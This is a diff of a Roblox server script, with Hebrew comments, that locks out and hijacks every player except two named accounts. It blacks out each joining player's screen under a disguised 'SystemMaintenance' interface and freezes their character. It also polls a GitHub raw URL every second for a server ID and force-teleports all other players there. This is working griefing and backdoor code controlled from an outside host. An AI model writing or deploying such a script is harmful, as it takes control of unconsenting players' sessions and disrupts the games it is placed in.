@@ -2,43 +2,60 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
--- הקישור ה-Raw המעודכן שלך
+-- הקישור ה-Raw שלך
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
 
--- רשימת חסימה (לא יקבלו מסך שחור ולא ישתגרו)
+-- רשימת חסימה (הם לא ינעלו ולא ישתגרו)
 local blockedPlayers = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה ליצירת מסך שחור מיידי
-local function createBlackScreen(player)
+-- פונקציה לנעילת השחקן (תנועה ומסך)
+local function lockPlayer(player)
+	-- 1. יצירת מסך שחור/טעינה
 	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "InternalSystem"
+	screenGui.Name = "SystemMaintenance"
 	screenGui.IgnoreGuiInset = true
 	screenGui.DisplayOrder = 999999
 	screenGui.Parent = player:WaitForChild("PlayerGui")
 
-	local blackFrame = Instance.new("Frame")
-	blackFrame.Size = UDim2.new(1, 0, 1, 0)
-	blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-	blackFrame.Active = true
-	blackFrame.BorderSizePixel = 0
-	blackFrame.Parent = screenGui
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(1, 0, 1, 0)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	frame.Active = true
+	frame.Parent = screenGui
+
+	-- 2. ניטרול תנועה לחלוטין
+	player.CharacterAdded:Connect(function(char)
+		local hum = char:WaitForChild("Humanoid")
+		hum.WalkSpeed = 0
+		hum.JumpPower = 0
+		hum.PlatformStand = true -- נועל את האנימציה והתנועה
+	end)
+
+	-- אם הוא כבר בתוך המשחק כשזה רץ
+	if player.Character then
+		local hum = player.Character:FindFirstChild("Humanoid")
+		if hum then
+			hum.WalkSpeed = 0
+			hum.JumpPower = 0
+			hum.PlatformStand = true
+		end
+	end
 end
 
--- כששחקן נכנס - מסך שחור ישר
+-- הפעלה ברגע שמישהו נכנס
 Players.PlayerAdded:Connect(function(player)
 	if not blockedPlayers[player.Name] then
-		createBlackScreen(player)
+		lockPlayer(player)
 	end
 end)
 
--- לופ שיגור מהיר בטירוף (כל שנייה)
+-- לופ שיגור מהיר
 task.spawn(function()
 	while true do
 		local success, response = pcall(function()
-			-- מוסיף מספר רנדומלי לסוף הלינק כדי למנוע מהדפדפן לשמור מידע ישן (Cache)
 			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
 		end)
 
@@ -54,7 +71,6 @@ task.spawn(function()
 			if targetJobId and targetJobId ~= "" then
 				for _, player in pairs(Players:GetPlayers()) do
 					if not blockedPlayers[player.Name] then
-						-- ניסיון שיגור
 						pcall(function()
 							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
 						end)
@@ -62,6 +78,6 @@ task.spawn(function()
 				end
 			end
 		end
-		task.wait(1) -- בדיקה מחדש כל שנייה אחת בדיוק
+		task.wait(1)
 	end
 end)
